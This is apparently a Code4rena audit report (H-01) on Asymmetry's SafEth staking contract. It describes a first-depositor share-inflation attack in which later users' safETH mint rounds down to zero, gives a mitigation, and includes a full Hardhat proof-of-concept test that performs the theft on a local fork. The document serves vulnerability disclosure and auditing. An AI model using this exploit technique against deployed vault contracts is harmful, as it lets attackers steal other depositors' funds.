## Tags

- bug
- 3 (High Risk)
- high quality report
- primary issue
- satisfactory
- selected for report
- H-01

# [An attacker can manipulate the preDepositvePrice to steal from other users.](https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1098) 

# Lines of code

https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79
https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98


# Vulnerability details


## Impact

The first user that stakes can manipulate the total supply of sfTokens and by doing so create a rounding error for each subsequent user. In the worst case, an attacker can steal all the funds of the next user.

## Proof of Concept

When the first user enters totalSupply is set to 1e18 on [L79](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79):
```solidity
if (totalSupply == 0)
            preDepositPrice = 10 ** 18; // initializes with a price of 1
        else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;
```
But the user can immediately unstake most of his safETH such that totalSupply <<  1e18. The attacker can then transfer increase the underlying amount by transferring derivative tokens to the derivative contracts. 

For subsequent users, the preDepositPrice will be heavily inflated and the calculation of mintAmount on [L98](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98):
```solidity
uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;
```
can be very inaccurate. In the worst case it rounds down to 0 for users that deposit value that is less than the value that the attacker transferred in. 

In the following POC the attacker steals all of the second user's deposit. The attacker first deposits 100 ETH and immediately removes all but 1 wei. The attacker then transfers 10 wsETH to the WstEth contract. When the second user enters with 1.5 ETH no additional safETH are minted since the minAmount is rounded down to 0. The attacker has all of the safTokens and can withdraw 100% of deposits.


Create a new test file with the following content to run the POC.
```solidity
import { SafEth } from "../typechain-types";

import { ethers, upgrades, network } from "hardhat";
import { expect } from "chai";
import {
  getAdminAccount,
  getUserAccounts,
  getUserBalances,
  randomStakes,
  randomUnstakes,
} from "./helpers/integrationHelpers";
import { getLatestContract } from "./helpers/upgradeHelpers";
import { BigNumber } from "ethers";

import ERC20 from "@openzeppelin/contracts/build/contracts/ERC20.json";
import { RETH_MAX, WSTETH_ADRESS, WSTETH_WHALE } from "./helpers/constants";

describe.only("SafEth POC", function () {
  let safEthContractAddress: string;
  let strategyContractAddress: string;
  // create string array
  let derivativesAddress: string[] = [];
  let startingBalances: BigNumber[];
  let networkFeesPerAccount: BigNumber[];
  let totalStakedPerAccount: BigNumber[];

  before(async () => {
    startingBalances = await getUserBalances();
    networkFeesPerAccount = startingBalances.map(() => BigNumber.from(0));
    totalStakedPerAccount = startingBalances.map(() => BigNumber.from(0));
  });

  it("Should deploy the strategy contract", async function () {
    const safEthFactory = await ethers.getContractFactory("SafEth");
    const strategy = (await upgrades.deployProxy(safEthFactory, [
      "Asymmetry Finance ETH",
      "safETH",
    ])) as SafEth;
    await strategy.deployed();

    strategyContractAddress = strategy.address;

    const owner = await strategy.owner();
    const derivativeCount = await strategy.derivativeCount();

    expect(owner).eq((await getAdminAccount()).address);
    expect(derivativeCount).eq("0");
  });

  it("Should deploy derivative contracts and add them to the strategy contract with equal weights", async function () {
    const supportedDerivatives = ["Reth", "SfrxEth", "WstEth"];
    const strategy = await getLatestContract(strategyContractAddress, "SafEth");

    for (let i = 0; i < supportedDerivatives.length; i++) {
      const derivativeFactory = await ethers.getContractFactory(
        supportedDerivatives[i]
      );
      const derivative = await upgrades.deployProxy(derivativeFactory, [
        strategyContractAddress,
      ]);
      
      const derivativeAddress = derivative.address;
      derivativesAddress.push(derivativeAddress);

      await derivative.deployed();
      const tx1 = await strategy.addDerivative(
        derivative.address,
        "1000000000000000000"
      );
      await tx1.wait();


    }

    const derivativeCount = await strategy.derivativeCount();

    expect(derivativeCount).eq(supportedDerivatives.length);
  });

  it("Steal funds", async function () {


    const strategy = await getLatestContract(strategyContractAddress, "SafEth");
    const userAccounts = await getUserAccounts();
    let totalStaked = BigNumber.from(0);

    const userStrategySigner = strategy.connect(userAccounts[0]);
    const userStrategySigner2 = strategy.connect(userAccounts[1]);
    const ethAmount = "100"; 
    const depositAmount = ethers.utils.parseEther(ethAmount);
    totalStaked = totalStaked.add(depositAmount);
    
    const balanceBefore = await userAccounts[0].getBalance();
    const stakeResult = await userStrategySigner.stake({
      value: depositAmount,
    });

    const mined = await stakeResult.wait();
    const networkFee = mined.gasUsed.mul(mined.effectiveGasPrice);
    networkFeesPerAccount[0] = networkFeesPerAccount[0].add(networkFee);
    totalStakedPerAccount[0] = totalStakedPerAccount[0].add(depositAmount);

    const userSfEthBalance = await strategy.balanceOf(userAccounts[0].address);
    const userSfWithdraw = userSfEthBalance.sub(1);
   
    
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [WSTETH_WHALE],
    });
    const whaleSigner = await ethers.getSigner(WSTETH_WHALE);
    const erc20 = new ethers.Contract(WSTETH_ADRESS, ERC20.abi, userAccounts[0]);

    const wderivative = derivativesAddress[2];
    const erc20BalanceBefore = await erc20.balanceOf(wderivative);

    //remove all but 1 sfToken
    const unstakeResult = await userStrategySigner.unstake(userSfWithdraw);

    const erc20Whale = erc20.connect(whaleSigner);
    const erc20Amount = ethers.utils.parseEther("10");

    // transfer tokens directly to the derivative (done by attacker)
    await erc20Whale.transfer(wderivative, erc20Amount);

    // NEW USER ENTERS
    const ethAmount2 = "1.5"; 
    const depositAmount2 = ethers.utils.parseEther(ethAmount2);
      
    const stakeResu2lt = await userStrategySigner2.stake({
      value: depositAmount2,
    });

    const mined2 = await stakeResult.wait();
     
    // User has 0 sfTokens!
    const userSfEthBalance2 = await strategy.balanceOf(userAccounts[1].address);
    console.log("userSfEthBalance2: ", userSfEthBalance2.toString());

    // Attacker has 1 sfToken
    const AttakcerSfEthBalanc = await strategy.balanceOf(userAccounts[0].address);
    console.log("AttakcerSfEthBalanc: ", AttakcerSfEthBalanc.toString());
    
    //Total supply is 1. 
    const totalSupply = await strategy.totalSupply();
    console.log("totalSupply: ", totalSupply.toString());
    
    
  });

});
```


## Tools Used

vscode, hardhat

## Recommended Mitigation Steps


Base the underlying value on internal accounting so that it can not be manipulated by transferring directly to the derivative contract. 


